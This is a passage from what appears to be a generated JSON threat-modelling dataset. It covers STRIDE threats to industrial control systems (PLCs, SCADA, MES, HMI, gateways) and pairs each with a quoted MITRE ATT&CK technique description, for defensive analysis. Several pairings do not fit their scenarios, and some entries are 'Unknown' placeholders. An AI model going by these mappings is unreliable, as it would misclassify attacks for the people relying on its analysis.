                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker could target the HMI with resource exhaustion attacks, leading to system freezes or crashes.",
            "Assumptions": [
                {
                    "Assumption": "HMI is not designed to handle high loads efficiently",
                    "Role": "HMI Designer",
                    "Condition": "Lack of performance optimization."
                },
                {
                    "Assumption": "No rate limiting implemented on HMI interactions",
                    "Role": "System Administrator",
                    "Condition": "Absence of controls to limit resource usage."
                }
            ],
            "Potential Impact": "Unresponsive HMI disrupts monitoring and control capabilities.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "resource exhaustion",
                "HMI",
                "crashes"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker could exploit a software vulnerability in the MES to gain higher-level access and manipulate production workflows.",
            "Assumptions": [
                {
                    "Assumption": "MES software contains exploitable vulnerabilities",
                    "Role": "Software Developer",
                    "Condition": "Slow patch management lifecycle."
                },
                {
                    "Assumption": "The attacker can execute code on the MES",
                    "Role": "Attacker",
                    "Condition": "Path is available for remote code execution."
                }
            ],
            "Potential Impact": "Manipulated production workflows lead to severe efficiency losses and possible equipment damage.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "MES",
                "software vulnerability",
                "production manipulation"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An insider with low-level access could escalate their privileges by exploiting improperly configured access controls in the gateway.",
            "Assumptions": [
                {
                    "Assumption": "Gateway access control mechanisms are misconfigured",
                    "Role": "Network Administrator",
                    "Condition": "Poorly implemented ACLs."
                },
                {
                    "Assumption": "Insiders have sufficient knowledge to exploit these configurations",
                    "Role": "Insider",
                    "Condition": "Technically skilled malicious insider."
                }
            ],
            "Potential Impact": "Unauthorized privilege escalation disrupts data flow and system integrity.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "gateway",
                "access control",
                "insider threat"
            ],
            "mitre_technique": {
                "name": "Direct Volume Access",
                "description": "Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique may bypass Windows file access controls as well as file system monitoring tools. (Citation: Hakobyan 2009)\n\nUtilities, such as `NinjaCopy`, exist to perform these actions in PowerShell.(Citation: Github PowerSploit Ninjacopy) Adversaries may also use built-in or third-party utilities (such as `vssadmin`, `wbadmin`, and [esentutl](https://attack.mitre.org/software/S0404)) to create shadow copies or backups of data from system volumes.(Citation: LOLBAS Esentutl)",
                "id": "attack-pattern--0c8ab3eb-df48-4b9c-ace7-beacaac81cc5",
                "technique_id": "T1006"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker could gain higher privileges on a PLC using old firmware with known vulnerabilities, manipulating industrial control processes.",
            "Assumptions": [
                {
                    "Assumption": "PLCs run outdated firmware versions",
                    "Role": "System Maintainer",
                    "Condition": "Lacks regular firmware updates."
                },
                {
                    "Assumption": "The attacker has access to the PLC network",
                    "Role": "Attacker",
                    "Condition": "Weak network security enables unauthorized access."
                }
            ],
            "Potential Impact": "Manipulated control processes risk safety and operational efficiency.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "PLC",
                "firmware vulnerability",
                "control manipulation"
            ],
            "mitre_technique": {
                "name": "Change Operating Mode",
                "description": "Adversaries may change the operating mode of a controller to gain additional access to engineering functions such as Program Download.   Programmable controllers typically have several modes of operation that control the state of the user program and control access to the controllers API. Operating modes can be physically selected using a key switch on the face of the controller but may also be selected with calls to the controllers API. Operating modes and the mechanisms by which they are selected often vary by vendor and product line. Some commonly implemented operating modes are described below:  \n\n* Program - This mode must be enabled before changes can be made to a devices program. This allows program uploads and downloads between the device and an engineering workstation. Often the PLCs logic Is halted, and all outputs may be forced off. (Citation: N.A. October 2017)  \n* Run - Execution of the devices program occurs in this mode. Input and output (values, points, tags, elements, etc.) are monitored and used according to the programs logic. [Program Upload](https://attack.mitre.org/techniques/T0845) and [Program Download](https://attack.mitre.org/techniques/T0843) are disabled while in this mode. (Citation: Omron) (Citation: Machine Information Systems 2007)  (Citation: N.A. October 2017) (Citation: PLCgurus 2021)   \n* Remote - Allows for remote changes to a PLCs operation mode. (Citation: PLCgurus 2021)    \n* Stop - The PLC and program is stopped, while in this mode, outputs are forced off. (Citation: Machine Information Systems 2007)   \n* Reset - Conditions on the PLC are reset to their original states. Warm resets may retain some memory while cold resets will reset all I/O and data registers. (Citation: Machine Information Systems 2007)   \n* Test / Monitor mode - Similar to run mode, I/O is processed, although this mode allows for monitoring, force set, resets, and more generally tuning or debugging of the system. Often monitor mode may be used as a trial for initialization. (Citation: Omron)",
                "id": "attack-pattern--2883c520-7957-46ca-89bd-dab1ad53b601",
                "technique_id": "T0858"
            }
        }
    ]
},
{
    "case_number": "4",
    "batch_number": "21",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a legitimate Control Center operator to issue malicious control commands to the Remote Terminal Units (RTUs).",
            "Assumptions": [
                {
                    "Assumption": "No two-factor or strong authentication is enforced for accessing the Control Center.",
                    "Role": "System Architect",
                    "Condition": "When designing the authentication mechanism."
                },
                {
                    "Assumption": "Attacker has physical or network access to the Control Center's login interface.",
                    "Role": "Attacker",
                    "Condition": "During the attack execution phase."
                },
                {
                    "Assumption": "User credentials are leaked or stolen through phishing or social engineering.",
                    "Role": "User",
                    "Condition": "As part of an initial compromise."
                }
            ],
            "Potential Impact": "Unauthorized control of RTUs, leading to operational disruption.",
            "MITRE ATT&CK Keywords": [
                "Impersonation",
                "Control Center",
                "Access Token Manipulation",
                "Phishing"
            ],
            "mitre_technique": {
                "name": "Application Access Token",
                "description": "Adversaries may use application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users and used in lieu of login credentials.\n\nApplication access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.(Citation: okta)\n\nFor example, with a cloud-based email service once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a \"refresh\" token enabling background access is awarded.(Citation: Microsoft Identity Platform Access 2019) With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.(Citation: Staaldraad Phishing with OAuth 2017)\n\nCompromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim\u2019s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords. Access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.\n",
                "id": "attack-pattern--27960489-4e7f-461d-a62a-f5c0cb521e4a",
                "technique_id": "T1527"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a counterfeit gateway to intercept and manipulate data between field devices and the cloud services.",
            "Assumptions": [
                {
                    "Assumption": "The gateway's authentication with field devices and cloud services is weak or not enforced.",
                    "Role": "System Architect",
                    "Condition": "When establishing the gateway's communication protocols."
                },
                {
                    "Assumption": "Attacker can introduce hardware into the network.",
                    "Role": "Attacker",
                    "Condition": "During the deployment phase of their hardware."
                },
                {
                    "Assumption": "Network monitoring does not adequately detect new or rogue devices.",
                    "Role": "Network Administrator",
                    "Condition": "Through inadequate network security policies."
                }
            ],
            "Potential Impact": "Data interception and manipulation, leading to inaccurate data analytics and possible operational failures.",
            "MITRE ATT&CK Keywords": [
                "Man-in-the-Middle",
                "Rogue Device",
                "Network Injection",
                "Data Manipulation"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker hijacks communication sessions between the MES and the ERP system to gain unauthorized access to sensitive production workflow data.",
            "Assumptions": [
                {
                    "Assumption": "Session management lacks proper security controls and encryption.",
                    "Role": "System Architect",
                    "Condition": "During the design of the session management system."
                },
                {
                    "Assumption": "Attacker is on the same network segment as the MES-ERP communication.",
                    "Role": "Attacker",
                    "Condition": "During the session hijacking attempt."
                },
                {
                    "Assumption": "Insufficient monitoring of session integrity and activity logging.",
                    "Role": "System Administrator",
                    "Condition": "Through poor logging and monitoring practices."
                }
            ],
            "Potential Impact": "Unauthorized access to and manipulation of production workflows, compromising data integrity and operational efficiency.",
            "MITRE ATT&CK Keywords": [
                "Session Hijacking",
                "Workflow Manipulation",
                "Unauthorized Access",
                "Network Eavesdropping"
            ],
            "mitre_technique": {
                "name": "Browser Session Hijacking",
                "description": "Adversaries may take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify user-behaviors, and intercept information as part of various browser session hijacking techniques.(Citation: Wikipedia Man in the Browser)\n\nA specific example is when an adversary injects software into a browser that allows them to inherit cookies, HTTP sessions, and SSL client certificates of a user then use the browser as a way to pivot into an authenticated intranet.(Citation: Cobalt Strike Browser Pivot)(Citation: ICEBRG Chrome Extensions) Executing browser-based behaviors such as pivoting may require specific process permissions, such as <code>SeDebugPrivilege</code> and/or high-integrity/administrator rights.\n\nAnother example involves pivoting browser traffic from the adversary's browser through the user's browser by setting up a proxy which will redirect web traffic. This does not alter the user's traffic in any way, and the proxy connection can be severed as soon as the browser is closed. The adversary assumes the security context of whichever browser process the proxy is injected into. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could potentially browse to any resource on an intranet, such as [Sharepoint](https://attack.mitre.org/techniques/T1213/002) or webmail, that is accessible through the browser and which the browser has sufficient permissions. Browser pivoting may also bypass security provided by 2-factor authentication.(Citation: cobaltstrike manual)",
                "id": "attack-pattern--544b0346-29ad-41e1-a808-501bb4193f47",
                "technique_id": "T1185"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains physical access to field devices and uploads malicious firmware to alter device behavior.",
            "Assumptions": [
                {
                    "Assumption": "Field devices are inadequately secured against physical access.",
                    "Role": "Facilities Manager",
                    "Condition": "When designing physical security controls."
                },
                {
                    "Assumption": "Firmware update processes lack integrity checks.",
                    "Role": "System Architect",
                    "Condition": "During the firmware update procedure development."
                },
                {
                    "Assumption": "Inconsistent or absent monitoring of field device integrity.",
                    "Role": "Security Analyst",
                    "Condition": "During regular security assessments."
                }
            ],
            "Potential Impact": "Corruption of sensor data, leading to incorrect control commands and operational failures.",
            "MITRE ATT&CK Keywords": [
                "Malicious Firmware",
                "Device Tampering",
                "Operational Disruption",
                "Integrity Compromise"
            ],
            "mitre_technique": {
                "name": "Module Firmware",
                "description": "Adversaries may install malicious or vulnerable firmware onto modular hardware devices. Control system devices often contain modular hardware devices. These devices may have their own set of firmware that is separate from the firmware of the main control system equipment.   \n\nThis technique is similar to [System Firmware](https://attack.mitre.org/techniques/T0857), but is conducted on other system components that may not have the same capabilities or level of integrity checking. Although it results in a device re-image, malicious device firmware may provide persistent access to remaining devices. (Citation: Daniel Peck,  Dale Peterson January 2009)  \n\nAn easy point of access for an adversary is the Ethernet card, which may have its own CPU, RAM, and operating system. The adversary may attack and likely exploit the computer on an Ethernet card. Exploitation of the Ethernet card computer may enable the adversary to accomplish additional attacks, such as the following: (Citation: Daniel Peck,  Dale Peterson January 2009)  \n\n* Delayed Attack - The adversary may stage an attack in advance and choose when to launch it, such as at a particularly damaging time.  \n* Brick the Ethernet Card - Malicious firmware may be programmed to result in an Ethernet card failure, requiring a factory return.  \n* Random Attack or Failure - The adversary may load malicious firmware onto multiple field devices. Execution of an attack and the time it occurs is generated by a pseudo-random number generator.   \n* A Field Device Worm - The adversary may choose to identify all field devices of the same model, with the end goal of performing a device-wide compromise.  \n* Attack Other Cards on the Field Device - Although it is not the most important module in a field device, the Ethernet card is most accessible to the adversary and malware. Compromise of the Ethernet card may provide a more direct route to compromising other modules, such as the CPU module.",
                "id": "attack-pattern--efbf7888-f61b-4572-9c80-7e2965c60707",
                "technique_id": "T0839"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker manipulates the data stored in the MES database by exploiting a SQL injection vulnerability.",
            "Assumptions": [
                {
                    "Assumption": "Application code is vulnerable to SQL injection attacks.",
                    "Role": "Developer",
                    "Condition": "During coding and without proper input validation."
                },
                {
                    "Assumption": "The database has weak or no validation on data changes.",
                    "Role": "Database Administrator",
                    "Condition": "During database management."
                },
                {
                    "Assumption": "An attacker can send crafted SQL queries to the MES system.",
                    "Role": "Attacker",
                    "Condition": "When connected to the MES network."
                }
            ],
            "Potential Impact": "Data corruption, leading to false operational metrics and workflow disruptions.",
            "MITRE ATT&CK Keywords": [
                "SQL Injection",
                "Database Manipulation",
                "Data Integrity",
                "Workflow Disruption"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies configuration files on the gateway to redirect data flows to a malicious endpoint.",
            "Assumptions": [
                {
                    "Assumption": "Configuration files are not adequately protected by access controls.",
                    "Role": "System Administrator",
                    "Condition": "During system configuration."
                },
                {
                    "Assumption": "The gateway lacks sufficient logging mechanisms for configuration changes.",
                    "Role": "Security Analyst",
                    "Condition": "Through insufficient logging practices."
                },
                {
                    "Assumption": "An attacker has network access to the gateway.",
                    "Role": "Attacker",
                    "Condition": "During network penetration activities."
                }
            ],
            "Potential Impact": "Unauthorized data redirection, leading to data leakage and potential unauthorized data manipulation.",
            "MITRE ATT&CK Keywords": [
                "Configuration Manipulation",
                "Data Redirection",
                "Unauthorized Access",
                "System Compromise"
            ],
            "mitre_technique": {
                "name": "Compromise Software Supply Chain",
                "description": "Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version.\n\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Avast CCleaner3 2018)(Citation: Command Five SK 2011)  ",
                "id": "attack-pattern--bd369cd9-abb8-41ce-b5bb-fff23ee86c00",
                "technique_id": "T1195.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A compromised user denies having altered the Control Center's configuration settings despite having done so.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient auditing and logging of configuration changes.",
                    "Role": "System Administrator",
                    "Condition": "During system management."
                },
                {
                    "Assumption": "No robust user activity tracking mechanisms in place.",
                    "Role": "System Architect",
                    "Condition": "During the design of user management systems."
                },
                {
                    "Assumption": "Weak access controls allow unauthorized changes.",
                    "Role": "Security Analyst",
                    "Condition": "Through inadequate access control policies."
                }
            ],
            "Potential Impact": "Difficulty in tracing unauthorized changes, vulnerability to repeated tampering, and potential operational disruptions.",
            "MITRE ATT&CK Keywords": [
                "Activity Denial",
                "Configuration Tampering",
                "System Logging",
                "Accountability"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies executing a critical command on the MES despite having done so, causing a significant workflow disruption.",
            "Assumptions": [
                {
                    "Assumption": "Missing or weak logging of command execution.",
                    "Role": "System Administrator",
                    "Condition": "During system maintenance."
                },
                {
                    "Assumption": "Lack of non-repudiation controls in the MES system.",
                    "Role": "System Architect",
                    "Condition": "During the design phase."
                },
                {
                    "Assumption": "User action logging is not tied to individual user identities.",
                    "Role": "Security Analyst",
                    "Condition": "During implementation of logging systems."
                }
            ],
            "Potential Impact": "Difficulty in tracing command sources, leading to potential reoccurrence and compromised production integrity.",
            "MITRE ATT&CK Keywords": [
                "Command Execution",
                "Denial of Action",
                "Logging Deficiency",
                "Workflow Disruption"
            ],
            "mitre_technique": {
                "name": "Block Command Message",
                "description": "Adversaries may block a command message from reaching its intended target to prevent command execution. In OT networks, command messages are sent to provide instructions to control system devices. A blocked command message can inhibit response functions from correcting a disruption or unsafe condition. (Citation: Bonnie Zhu, Anthony Joseph, Shankar Sastry 2011)  (Citation: Electricity Information Sharing and Analysis Center; SANS Industrial Control Systems March 2016)",
                "id": "attack-pattern--008b8f56-6107-48be-aa9f-746f927dbb61",
                "technique_id": "T0803"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user claims not to have accessed sensitive data from the cloud services although access logs show otherwise.",
            "Assumptions": [
                {
                    "Assumption": "Cloud access logs are not securely maintained.",
                    "Role": "Cloud Administrator",
                    "Condition": "During log management."
                },
                {
                    "Assumption": "Logging mechanisms do not capture comprehensive access details.",
                    "Role": "System Architect",
                    "Condition": "During system design."
                },
                {
                    "Assumption": "No multi-factor authentication enforced for accessing sensitive cloud data.",
                    "Role": "Security Policy Maker",
                    "Condition": "When setting authentication policies."
                }
            ],
            "Potential Impact": "Challenges in tracing unauthorized data access, leading to potential recurring incidents and data confidentiality breaches.",
            "MITRE ATT&CK Keywords": [
                "Access Log Manipulation",
                "Data Access Denial",
                "Cloud Security",
                "Non-repudiation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts unencrypted communication between field devices and the SCADA system, gaining access to sensitive operational data.",
            "Assumptions": [
                {
                    "Assumption": "Field device communications are not encrypted.",
                    "Role": "System Architect",
                    "Condition": "During system design."
                },
                {
                    "Assumption": "Attacker has access to the network carrying these communications.",
                    "Role": "Attacker",
                    "Condition": "During network penetration."
                },
                {
                    "Assumption": "No strong network segregation is implemented.",
                    "Role": "Network Engineer",
                    "Condition": "Through poor network segmentation practices."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of operational data, leading to potential operational manipulation and sabotage.",
            "MITRE ATT&CK Keywords": [
                "Unencrypted Communication",
                "Data Interception",
                "Network Eavesdropping",
                "Operational Data Leak"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A malware exfiltrates sensitive data from the MES database to an external command and control server.",
            "Assumptions": [
                {
                    "Assumption": "MES does not have effective malware detection and prevention mechanisms.",
                    "Role": "System Administrator",
                    "Condition": "During mes system operation."
                },
                {
                    "Assumption": "Outgoing traffic is not adequately monitored for anomalies.",
                    "Role": "Network Admin",
                    "Condition": "Through inadequate network traffic analysis."
                },
                {
                    "Assumption": "Sensitive data in the database is not encrypted at rest.",
                    "Role": "Database Admin",
                    "Condition": "When configuring database security."
                }
            ],
            "Potential Impact": "Loss of sensitive operational data, impact on competitive advantage, and potential regulatory fines.",
            "MITRE ATT&CK Keywords": [
                "Data Exfiltration",
                "Malware",
                "Command and Control",
                "Database Breach"
            ],
            "mitre_technique": {
                "name": "Create or Modify System Process",
                "description": "Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services.(Citation: TechNet Services) On macOS, launchd processes known as [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) and [Launch Agent](https://attack.mitre.org/techniques/T1543/001) are run to finish system initialization and load user specific parameters.(Citation: AppleDocs Launch Agent Daemons) \n\nAdversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.  \n\nServices, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges.(Citation: OSX Malware Detection)  ",
                "id": "attack-pattern--106c0cf6-bf73-4601-9aa8-0945c2715ec5",
                "technique_id": "T1543"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains access to sensitive production data stored in cloud storage through compromised cloud service provider credentials.",
            "Assumptions": [
                {
                    "Assumption": "Weak or reused credentials for accessing cloud services.",
                    "Role": "Cloud User",
                    "Condition": "During credential management."
                },
                {
                    "Assumption": "Cloud services do not enforce strong multi-factor authentication (MFA).",
                    "Role": "Cloud Administrator",
                    "Condition": "When configuring service authentication settings."
                },
                {
                    "Assumption": "Lack of monitoring and alerting on suspicious login attempts.",
                    "Role": "Security Analyst",
                    "Condition": "Through inadequate monitoring practices."
                }
            ],
            "Potential Impact": "Unauthorized access and potential exposure of sensitive data critical to manufacturing processes.",
            "MITRE ATT&CK Keywords": [
                "Cloud Credential Compromise",
                "Sensitive Data Access",
                "Insufficient Authentication",
                "Cloud Storage Breach"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A Distributed Denial of Service (DDoS) attack targets the Control Center, overwhelming it with traffic and disrupting control operations.",
            "Assumptions": [
                {
                    "Assumption": "The Control Center lacks sufficient DDoS mitigation measures.",
                    "Role": "Network Engineer",
                    "Condition": "During network security configuration."
                },
                {
                    "Assumption": "Internet-facing endpoints are exposed to the public.",
                    "Role": "System Architect",
                    "Condition": "When designing network exposure."
                },
                {
                    "Assumption": "No redundant systems or failover mechanisms in place.",
                    "Role": "System Administrator",
                    "Condition": "During system redundancy planning."
                }
            ],
            "Potential Impact": "Disruption in issuing control commands, leading to potential operational halts and safety risks.",
            "MITRE ATT&CK Keywords": [
                "DDoS Attack",
                "Traffic Overload",
                "Control Center Disruption",
                "Service Unavailability"
            ],
            "mitre_technique": {
                "name": "Endpoint Denial of Service",
                "description": "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.(Citation: ArsTechnica Great Firewall of China)\n\nFor attacks attempting to saturate the providing network, see [Network Denial of Service](https://attack.mitre.org/techniques/T1498).\n",
                "id": "attack-pattern--c675646d-e204-4aa8-978d-e3d6d65885c4",
                "technique_id": "T1499"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits vulnerabilities in field devices to flood the network with spoofed data packets, causing a denial of service on the SCADA network.",
            "Assumptions": [
                {
                    "Assumption": "Field devices are vulnerable to data packet manipulation.",
                    "Role": "Device Manufacturer",
                    "Condition": "During device production."
                },
                {
                    "Assumption": "Network lacks adequate intrusion detection and prevention systems (IDPS).",
                    "Role": "Network Security Team",
                    "Condition": "Through insufficient security controls."
                },
                {
                    "Assumption": "No rate limiting is applied to incoming data packets.",
                    "Role": "Network Engineer",
                    "Condition": "When configuring network settings."
                }
            ],
            "Potential Impact": "Network congestion, leading to delayed or lost data transmission and operational inefficiencies.",
            "MITRE ATT&CK Keywords": [
                "Packet Flooding",
                "Network Congestion",
                "Service Disruption",
                "SCADA Network"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
